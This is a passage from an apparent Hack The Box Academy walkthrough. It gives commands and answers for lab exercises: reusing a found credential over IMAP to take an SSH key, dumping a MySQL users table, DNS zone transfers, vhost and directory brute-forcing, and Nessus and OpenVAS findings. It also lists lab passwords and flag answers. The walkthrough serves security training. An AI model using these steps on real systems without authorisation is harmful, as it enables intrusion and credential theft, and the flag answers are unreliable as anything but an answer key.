</span></code></pre></div></td></tr></table></div>
<p>In the results a credential is showed:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-95-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1"></a>tom NMds732Js2761
</span></code></pre></div></td></tr></table></div>
<p>We use that credential to login into the IMAP server:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-96-1">1</a></span>
<span class="normal"><a href="#__codelineno-96-2">2</a></span>
<span class="normal"><a href="#__codelineno-96-3">3</a></span>
<span class="normal"><a href="#__codelineno-96-4">4</a></span>
<span class="normal"><a href="#__codelineno-96-5">5</a></span>
<span class="normal"><a href="#__codelineno-96-6">6</a></span>
<span class="normal"><a href="#__codelineno-96-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1"></a>openssl s_client -connect $ip:imaps
</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2"></a>
</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3"></a>a LOGIN tom NMds732Js2761
</span><span id="__span-96-4"><a id="__codelineno-96-4" name="__codelineno-96-4"></a>
</span><span id="__span-96-5"><a id="__codelineno-96-5" name="__codelineno-96-5"></a>a SELECT INBOX
</span><span id="__span-96-6"><a id="__codelineno-96-6" name="__codelineno-96-6"></a>a FETCH 1 all
</span><span id="__span-96-7"><a id="__codelineno-96-7" name="__codelineno-96-7"></a>a FETCH 1 BODY.PEEK[TEXT]
</span></code></pre></div></td></tr></table></div>
<p>And we obtain a OPENSSH PRIVATE KEY that we save into our ~/.ssh folder. We give 600 permission to the file id_rsa.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-97-1">1</a></span>
<span class="normal"><a href="#__codelineno-97-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1"></a>chmod 600 id_rsa
</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2"></a>ssh tom@$ip
</span></code></pre></div></td></tr></table></div>
<p>Now, we are in. I had a look at the history file and saw a MySQL connection:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-98-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1"></a>history
</span></code></pre></div></td></tr></table></div>
<p>I decided to have a look at it:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-99-1">1</a></span>
<span class="normal"><a href="#__codelineno-99-2">2</a></span>
<span class="normal"><a href="#__codelineno-99-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1"></a>mysql -u tom -p
</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2"></a>
</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3"></a>#Enter the password NMds732Js2761
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-100-1">1</a></span>
<span class="normal"><a href="#__codelineno-100-2">2</a></span>
<span class="normal"><a href="#__codelineno-100-3">3</a></span>
<span class="normal"><a href="#__codelineno-100-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1"></a>show databases;
</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2"></a>use users;
</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3"></a>show tables;
</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4"></a>select * from users;
</span></code></pre></div></td></tr></table></div>
<p>Results: cr3n4o7rzse7rzhnckhssncif7ds</p>
<h2 id="information-gathering-web-edition"><a href="https://academy.hackthebox.com/module/details/144">Information Gathering - Web Edition</a></h2>
<h3 id="whois">WHOIS</h3>
<h4 id="utilizing-whois">Utilizing WHOIS</h4>
<p><strong>Perform a WHOIS lookup against the paypal.com domain. What is the registrar Internet Assigned Numbers Authority (IANA) ID number?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-101-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1"></a>whoid paypal.com
</span></code></pre></div></td></tr></table></div>
<p>Results: 292</p>
<p><strong>What is the admin email contact for the tesla.com domain (also in-scope for the Tesla bug bounty program)?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-102-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1"></a>whoid tesla.com
</span></code></pre></div></td></tr></table></div>
<p>Results: admin@dnstinations.com</p>
<h3 id="dns-subdomains">DNS &amp; Subdomains</h3>
<h4 id="digging-dns">Digging DNS</h4>
<p><strong>Which IP address maps to inlanefreight.com?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-103-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1"></a>dig +short inlanefreight.com
</span></code></pre></div></td></tr></table></div>
<p>Results: 134.209.24.248</p>
<p><strong>Which domain is returned when querying the PTR record for 134.209.24.248?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-104-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1"></a>dig -x 134.209.24.248 @1.1.1.1
</span></code></pre></div></td></tr></table></div>
<p>Results:  inlanefreight.com</p>
<p>What is the full domain returned when you query the mail records for facebook.com?</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-105-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1"></a>dig MX facebook.com
</span></code></pre></div></td></tr></table></div>
<p>Results: smtpin.vvv.facebook.com</p>
<h4 id="subdomain-bruteforcing">Subdomain BruteForcing</h4>
<p><strong>Using the known subdomains for inlanefreight.com (www, ns1, ns2, ns3, blog, support, customer), find any missing subdomains by brute-forcing possible domain names. Prov</strong>ide your answer with the complete subdomain, e.g., www.inlanefreight.com.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-106-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1"></a>dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
</span></code></pre></div></td></tr></table></div>
<p>Results: my.inlanefreight.com</p>
<h4 id="dns-zone-transfers">DNS Zone Transfers</h4>
<p><strong>After performing a zone transfer for the domain inlanefreight.htb on the target system, how many DNS records are retrieved from the target system's name server? Provide your answer as an integer, e.g, 123.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-107-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1"></a>dig axfr inlanefreight.htb @$ip 
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-108-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-108-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-108-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-108-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-108-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-108-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-108-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-108-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-108-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-108-10">10</a></span>
<span class="normal"><a href="#__codelineno-108-11">11</a></span>
<span class="normal"><a href="#__codelineno-108-12">12</a></span>
<span class="normal"><a href="#__codelineno-108-13">13</a></span>
<span class="normal"><a href="#__codelineno-108-14">14</a></span>
<span class="normal"><a href="#__codelineno-108-15">15</a></span>
<span class="normal"><a href="#__codelineno-108-16">16</a></span>
<span class="normal"><a href="#__codelineno-108-17">17</a></span>
<span class="normal"><a href="#__codelineno-108-18">18</a></span>
<span class="normal"><a href="#__codelineno-108-19">19</a></span>
<span class="normal"><a href="#__codelineno-108-20">20</a></span>
<span class="normal"><a href="#__codelineno-108-21">21</a></span>
<span class="normal"><a href="#__codelineno-108-22">22</a></span>
<span class="normal"><a href="#__codelineno-108-23">23</a></span>
<span class="normal"><a href="#__codelineno-108-24">24</a></span>
<span class="normal"><a href="#__codelineno-108-25">25</a></span>
<span class="normal"><a href="#__codelineno-108-26">26</a></span>
<span class="normal"><a href="#__codelineno-108-27">27</a></span>
<span class="normal"><a href="#__codelineno-108-28">28</a></span>
<span class="normal"><a href="#__codelineno-108-29">29</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1"></a># Response
</span><span id="__span-108-2"><a id="__codelineno-108-2" name="__codelineno-108-2"></a>; &lt;&lt;&gt;&gt; DiG 9.19.21-1-Debian &lt;&lt;&gt;&gt; axfr inlanefreight.htb @10.129.72.193
</span><span id="__span-108-3"><a id="__codelineno-108-3" name="__codelineno-108-3"></a>;; global options: +cmd
</span><span id="__span-108-4"><a id="__codelineno-108-4" name="__codelineno-108-4"></a>inlanefreight.htb.  604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
</span><span id="__span-108-5"><a id="__codelineno-108-5" name="__codelineno-108-5"></a>inlanefreight.htb.  604800  IN  NS  ns.inlanefreight.htb.
</span><span id="__span-108-6"><a id="__codelineno-108-6" name="__codelineno-108-6"></a>admin.inlanefreight.htb. 604800 IN  A   10.10.34.2
</span><span id="__span-108-7"><a id="__codelineno-108-7" name="__codelineno-108-7"></a>ftp.admin.inlanefreight.htb. 604800 IN  A   10.10.34.2
</span><span id="__span-108-8"><a id="__codelineno-108-8" name="__codelineno-108-8"></a>careers.inlanefreight.htb. 604800 IN    A   10.10.34.50
</span><span id="__span-108-9"><a id="__codelineno-108-9" name="__codelineno-108-9"></a>dc1.inlanefreight.htb.  604800  IN  A   10.10.34.16
</span><span id="__span-108-10"><a id="__codelineno-108-10" name="__codelineno-108-10"></a>dc2.inlanefreight.htb.  604800  IN  A   10.10.34.11
</span><span id="__span-108-11"><a id="__codelineno-108-11" name="__codelineno-108-11"></a>internal.inlanefreight.htb. 604800 IN   A   127.0.0.1
</span><span id="__span-108-12"><a id="__codelineno-108-12" name="__codelineno-108-12"></a>admin.internal.inlanefreight.htb. 604800 IN A   10.10.1.11
</span><span id="__span-108-13"><a id="__codelineno-108-13" name="__codelineno-108-13"></a>wsus.internal.inlanefreight.htb. 604800 IN A    10.10.1.240
</span><span id="__span-108-14"><a id="__codelineno-108-14" name="__codelineno-108-14"></a>ir.inlanefreight.htb.   604800  IN  A   10.10.45.5
</span><span id="__span-108-15"><a id="__codelineno-108-15" name="__codelineno-108-15"></a>dev.ir.inlanefreight.htb. 604800 IN A   10.10.45.6
</span><span id="__span-108-16"><a id="__codelineno-108-16" name="__codelineno-108-16"></a>ns.inlanefreight.htb.   604800  IN  A   127.0.0.1
</span><span id="__span-108-17"><a id="__codelineno-108-17" name="__codelineno-108-17"></a>resources.inlanefreight.htb. 604800 IN  A   10.10.34.100
</span><span id="__span-108-18"><a id="__codelineno-108-18" name="__codelineno-108-18"></a>securemessaging.inlanefreight.htb. 604800 IN A  10.10.34.52
</span><span id="__span-108-19"><a id="__codelineno-108-19" name="__codelineno-108-19"></a>test1.inlanefreight.htb. 604800 IN  A   10.10.34.101
</span><span id="__span-108-20"><a id="__codelineno-108-20" name="__codelineno-108-20"></a>us.inlanefreight.htb.   604800  IN  A   10.10.200.5
</span><span id="__span-108-21"><a id="__codelineno-108-21" name="__codelineno-108-21"></a>cluster14.us.inlanefreight.htb. 604800 IN A 10.10.200.14
</span><span id="__span-108-22"><a id="__codelineno-108-22" name="__codelineno-108-22"></a>messagecenter.us.inlanefreight.htb. 604800 IN A 10.10.200.10
</span><span id="__span-108-23"><a id="__codelineno-108-23" name="__codelineno-108-23"></a>ww02.inlanefreight.htb. 604800  IN  A   10.10.34.112
</span><span id="__span-108-24"><a id="__codelineno-108-24" name="__codelineno-108-24"></a>www1.inlanefreight.htb. 604800  IN  A   10.10.34.111
</span><span id="__span-108-25"><a id="__codelineno-108-25" name="__codelineno-108-25"></a>inlanefreight.htb.  604800  IN  SOA inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
</span><span id="__span-108-26"><a id="__codelineno-108-26" name="__codelineno-108-26"></a>;; Query time: 540 msec
</span><span id="__span-108-27"><a id="__codelineno-108-27" name="__codelineno-108-27"></a>;; SERVER: 10.129.72.193#53(10.129.72.193) (TCP)
</span><span id="__span-108-28"><a id="__codelineno-108-28" name="__codelineno-108-28"></a>;; WHEN: Tue Sep 10 15:25:16 EDT 2024
</span><span id="__span-108-29"><a id="__codelineno-108-29" name="__codelineno-108-29"></a>;; XFR size: 22 records (messages 1, bytes 594)
</span></code></pre></div></td></tr></table></div>
<p>Results: 22</p>
<p><strong>Within the zone record transferred above, find the ip address for ftp.admin.inlanefreight.htb. Respond only with the IP address, eg 127.0.0.1</strong></p>
<p>Results:  10.10.34.2</p>
<p><strong>Within the same zone record, identify the largest IP address allocated within the 10.10.200 IP range. Respond with the full IP address, eg 10.10.200.1</strong></p>
<p>Results:  10.10.200.14</p>
<h4 id="virtual-hosts">Virtual Hosts</h4>
<p><strong>Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "web"? Answer using the full domain, e.g. "x.inlanefreight.htb"</strong></p>
<p>Important, the --append-domain part</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-109-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1"></a>gobuster vhost -u http://$domain:$port/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
</span></code></pre></div></td></tr></table></div>
<p>Results: web17611.inlanefreight.htb</p>
<p><strong>Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "vm"? Answer using the full domain, e.g. "x.inlanefreight.htb"</strong></p>
<p>Results: vm5.inlanefreight.htb</p>
<p><strong>Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "br"? Answer using the full domain, e.g. "x.inlanefreight.htb"</strong></p>
<p>Results: browser.inlanefreight.htb</p>
<p><strong>Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "a"? Answer using the full domain, e.g. "x.inlanefreight.htb"</strong></p>
<p>Results: admin.inlanefreight.htb</p>
<p><strong>Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "su"? Answer using the full domain, e.g. "x.inlanefreight.htb"</strong></p>
<p>Results: support.inlanefreight.htb</p>
<h3 id="fingerprinting">Fingerprinting</h3>
<h4 id="fingerprinting_1">Fingerprinting</h4>
<p><strong>Determine the Apache version running on app.inlanefreight.local on the target system. (Format: 0.0.0)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-110-1">1</a></span>
<span class="normal"><a href="#__codelineno-110-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1"></a>sudo echo $ip app.inlanefreight.local &gt;&gt; /etc/hosts
</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2"></a>curl -I app.inlanefreight.local
</span></code></pre></div></td></tr></table></div>
<p>Results: 2.4.41B</p>
<p><strong>Which CMS is used on app.inlanefreight.local on the target system? Respond with the name only, e.g., WordPress.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-111-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1"></a>whatweb http://app.inlanefreight.local
</span></code></pre></div></td></tr></table></div>
<p>Results: Joomla</p>
<p><strong>On which operating system is the dev.inlanefreight.local webserver running in the target system? Respond with the name only, e.g., Debian.</strong></p>
<p>Results: Ubuntu </p>
<h3 id="crawling">Crawling</h3>
<h4 id="creepy-crawlies">Creepy crawlies</h4>
<p><strong>After spidering inlanefreight.com, identify the location where future reports will be stored. Respond with the full domain, e.g., files.inlanefreight.com.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-112-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1"></a>python3 ReconSpider.py https://inlanefreight.com
</span></code></pre></div></td></tr></table></div>
<p>Results: inlanefreight-comp133.s3.amazonaws.htb</p>
<h3 id="web-archives">Web Archives</h3>
<p><strong>How many Pen Testing Labs did HackTheBox have on the 8th August 2018? Answer with an integer, eg 1234.</strong></p>
<p>Go to https://web.archive.org/web/20180808080705/https://www.hackthebox.eu/</p>
<p>Results: 74</p>
<p><strong>How many members did HackTheBox have on the 10th June 2017? Answer with an integer, eg 1234.</strong></p>
<p>Go to https://web.archive.org/web/20180808080705/https://www.hackthebox.eu/</p>
<p>Results: 3054</p>
<p><strong>Going back to March 2002, what website did the facebook.com domain redirect too? Answer with the full domain, eg http://www.facebook.com/</strong></p>
<p>Go to https://web.archive.org/web/20020601000000*/www.facebook.com</p>
<p>Results:  http://site.aboutface.com/</p>
<p><strong>According to the paypal.com website in October 1999, what could you use to "beam money to anyone"? Answer with the product name, eg My Device, remove the ™ from your answer.</strong></p>
<p>Go to https://web.archive.org/web/19991013140707/http://paypal.com/</p>
<p>Results: Palm 0rganizer</p>
<p><strong>Going back to November 1998 on google.com, what address hosted the non-alpha "Google Search Engine Prototype" of Google? Answer with the full address, eg http://google.com</strong></p>
<p>Go to https://web.archive.org/web/19981111184551/http://google.com/</p>
<p>Results: http://google.stanford.edu/</p>
<p><strong>Going back to March 2000 on www.iana.org, when exacty was the site last updated? Answer with the date in the footer, eg 11-March-99</strong></p>
<p>Go to https://web.archive.org/web/20000303211237/http://www.iana.org/</p>
<p>Results: 17-December-99</p>
<p><strong>According to the wikipedia.com snapshot taken in March 2001, how many pages did they have over? Answer with the number they state without any commas, eg 2000 not 2,000</strong></p>
<p>Go to https://web.archive.org/web/20010331173908/http://www.wikipedia.com/</p>
<p>Results: 3000</p>
<h3 id="skills-assessment_1">Skills Assessment</h3>
<p><strong>What is the IANA ID of the registrar of the inlanefreight.com domain?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-113-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1"></a>whois inlanefreight.com
</span></code></pre></div></td></tr></table></div>
<p>Results: 468</p>
<p><strong>What http server software is powering the inlanefreight.htb site on the target system? Respond with the name of the software, not the version, e.g., Apache.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-114-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1"></a>curl -I $ip:$port
</span></code></pre></div></td></tr></table></div>
<p>Results: nginx</p>
<p><strong>What is the API key in the hidden admin directory that you have discovered on the target system?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-115-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-115-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-115-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-115-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-115-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-115-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-115-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-115-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-115-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-115-10">10</a></span>
<span class="normal"><a href="#__codelineno-115-11">11</a></span>
<span class="normal"><a href="#__codelineno-115-12">12</a></span>
<span class="normal"><a href="#__codelineno-115-13">13</a></span>
<span class="normal"><a href="#__codelineno-115-14">14</a></span>
<span class="normal"><a href="#__codelineno-115-15">15</a></span>
<span class="normal"><a href="#__codelineno-115-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1"></a># 1. Add $ip inlanefreight.htb to /etc/hosts
</span><span id="__span-115-2"><a id="__codelineno-115-2" name="__codelineno-115-2"></a>
</span><span id="__span-115-3"><a id="__codelineno-115-3" name="__codelineno-115-3"></a># 2. Create variable $port
</span><span id="__span-115-4"><a id="__codelineno-115-4" name="__codelineno-115-4"></a>
</span><span id="__span-115-5"><a id="__codelineno-115-5" name="__codelineno-115-5"></a># 3. Do a vhost scan. For instance
</span><span id="__span-115-6"><a id="__codelineno-115-6" name="__codelineno-115-6"></a>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://inlanefreight.htb:$port -H &quot;HOST:FUZZ.inlanefreight.htb&quot; -fs 120
</span><span id="__span-115-7"><a id="__codelineno-115-7" name="__codelineno-115-7"></a>
</span><span id="__span-115-8"><a id="__codelineno-115-8" name="__codelineno-115-8"></a># 4. Add the discovered VHOST to /etc/hosts
</span><span id="__span-115-9"><a id="__codelineno-115-9" name="__codelineno-115-9"></a>
</span><span id="__span-115-10"><a id="__codelineno-115-10" name="__codelineno-115-10"></a># 5. Enumerate the site 
</span><span id="__span-115-11"><a id="__codelineno-115-11" name="__codelineno-115-11"></a>dirb http://web1337.inlanefreight.htb:$port
</span><span id="__span-115-12"><a id="__codelineno-115-12" name="__codelineno-115-12"></a>
</span><span id="__span-115-13"><a id="__codelineno-115-13" name="__codelineno-115-13"></a># 6. There is a robots.txt file in the results, with a hiden admin panel. Trying to access directly the panel returns a 404. However we could try to fuzz it deeper:
</span><span id="__span-115-14"><a id="__codelineno-115-14" name="__codelineno-115-14"></a>ffuf -recursion -recursion-depth 1 -u http://web1337.inlanefreight.htb:53178/admin_h1dd3n/FUZZ -w /usr/share/seclists//Discovery/Web-Content/common.txt
</span><span id="__span-115-15"><a id="__codelineno-115-15" name="__codelineno-115-15"></a>
</span><span id="__span-115-16"><a id="__codelineno-115-16" name="__codelineno-115-16"></a># 7. There is one result: index.html. Go to http://web1337.inlanefreight.htb:$port/admin_h1dd3n/index.html to retrieve the flag.
</span></code></pre></div></td></tr></table></div>
<p>Results:  e963d863ee0e82ba7080fbf558ca0d3f</p>
<p><strong>After crawling the inlanefreight.htb domain on the target system, what is the email address you have found? Respond with the full email, e.g., mail@inlanefreight.htb.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-116-1">1</a></span>
<span class="normal"><a href="#__codelineno-116-2">2</a></span>
<span class="normal"><a href="#__codelineno-116-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1"></a># 1. Following the previous question, additional vhost discovery could be done:
</span><span id="__span-116-2"><a id="__codelineno-116-2" name="__codelineno-116-2"></a>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://inlanefreight.htb:$port -H &quot;HOST:FUZZ.web1337.inlanefreight.htb&quot; -fs 120
</span><span id="__span-116-3"><a id="__codelineno-116-3" name="__codelineno-116-3"></a># Add the second discovered VHOST (`dev`) to /etc/host, and visit the site http://dev.web1337.inlanefreight.htb/index.html. Notice that there is a next button, that takes you to a http://dev.web1337.inlanefreight.htb/index-123.html. Set-up an intruder attack with Numbered payload
</span></code></pre></div></td></tr></table></div>
<p><img alt="pay" src="../img/payload_00.png" /></p>
<p><img alt="pay" src="../img/payload_02.png" /></p>
<p>Results:   1337testing@inlanefreight.htb</p>
<p><strong>What is the API key the inlanefreight.htb developers will be changing too?</strong></p>
<p><img alt="pay" src="../img/payload_01.png" /></p>
<p>Results: ba988b835be4aa97d068941dc852ff33</p>
<h2 id="vulnerability-assessment"><a href="https://academy.hackthebox.com/module/details/108">Vulnerability Assessment</a></h2>
<h3 id="nesus">Nesus</h3>
<h4 id="nessus-skills-assessment">Nessus Skills assessment</h4>
<p><strong>What is the name of one of the accessible SMB shares from the authenticated Windows scan? (One word)</strong></p>
<p>Authenticate to port 22  with user "htb-student" and password "HTB_@cademy_student!". Start nessus and go to the IP:8834 url. Have a look at the windows scan.</p>
<p>Results: wsus</p>
<p><strong>What was the target for the authenticated scan?</strong> </p>
<p>Results: 172.16.16.100</p>
<p><strong>What is the plugin ID of the highest criticality vulnerability for the Windows authenticated scan?</strong> </p>
<p>Results: 156032</p>
<p><strong>What is the name of the vulnerability with plugin ID 26925 from the Windows authenticated scan? (Case sensitive)</strong></p>
<p>Results:   VNC Server Unauthenticated Access</p>
<p><strong>What port is the VNC server running on in the authenticated Windows scan?</strong></p>
<p>Results:  5900</p>
<h3 id="openvass">Openvass</h3>
<h4 id="openvass-skills-assessment">Openvass Skills assessment</h4>
<p><strong>What type of operating system is the Linux host running? (one word)</strong></p>
<p>Results:  Ubuntu</p>
<p><strong>What type of FTP vulnerability is on the Linux host? (Case Sensitive, four words)</strong></p>
<p>Results:  Anonymous FTP Login Reporting</p>
<p><strong>What is the IP of the Linux host targeted for the scan?</strong></p>
<p>Results:  172.16.16.160</p>
<p><strong>What vulnerability is associated with the HTTP server? (Case-sensitive)</strong></p>
<p>Results:  Cleartext Transmission of Sensitive Information via HTTP</p>
<h2 id="file-transfers"><a href="https://academy.hackthebox.com/module/details/24">File Transfers</a></h2>
<h3 id="windows-file-transfer-methods">Windows File Transfer methods</h3>
<p><strong>Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer.</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-117-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1"></a>curl<span class="w"> </span>http://<span class="nv">$ip</span>:80/flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results:  b1a4ca918282fcd96004565521944a3b</p>
<p>RDP to 10.129.201.55 (ACADEMY-MISC-MS02) with user "htb-student" and password "HTB_@cademy_stdnt!".
<strong>Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-118-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-118-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-118-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-118-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-118-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-118-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-118-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-118-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-118-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-118-10">10</a></span>
<span class="normal"><a href="#__codelineno-118-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1"></a># First download the file to your kali. Second, run a server, for instance this PHP server
</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2"></a>sudo php -S 0.0.0.0:80
</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3"></a>
</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4"></a># Launch a RDP connection
</span><span id="__span-118-5"><a id="__codelineno-118-5" name="__codelineno-118-5"></a>xfreerdp /cert:ignore /u:$user /p:$pass /v:$ip
